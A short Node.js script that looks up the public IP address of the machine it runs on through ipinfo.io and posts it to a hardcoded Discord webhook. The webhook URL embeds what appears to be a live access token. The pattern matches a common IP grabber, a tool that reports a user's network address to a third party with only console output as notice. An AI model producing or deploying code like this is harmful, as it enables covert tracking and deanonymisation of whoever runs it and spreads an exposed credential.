const fetch = require('node-fetch');

// Function to fetch IP address from ipinfo.io
async function fetchIpAddress() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        if (response.ok) {
            const data = await response.json();
            return data.ip;
        } else {
            throw new Error('Failed to fetch IP address');
        }
    } catch (error) {
        console.error('Error fetching IP address:', error.message);
        return null;
    }
}

// Function to send IP address to Discord webhook
async function sendToDiscord(ipAddress) {
    const webhookURL = 'https://discord.com/api/webhooks/1261843593312604160/wXmyqmdBx4lZ4MAp338SpV18VQ0B7tFXVC65qA18a2Ia8aizvb7LSLc-SpNu7CJMj4wY';
    const message = `New IP Address: ${ipAddress}`;

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        });

        if (response.ok) {
            console.log('IP address sent to Discord successfully.');
        } else {
            throw new Error('Failed to send IP address to Discord');
        }
    } catch (error) {
        console.error('Error sending IP address to Discord:', error.message);
    }
}

// Main function to orchestrate the process
async function main() {
    const ipAddress = await fetchIpAddress();
    if (ipAddress) {
        await sendToDiscord(ipAddress);
    } else {
        console.log('IP address not available.');
    }
}

// Execute the main function
main();
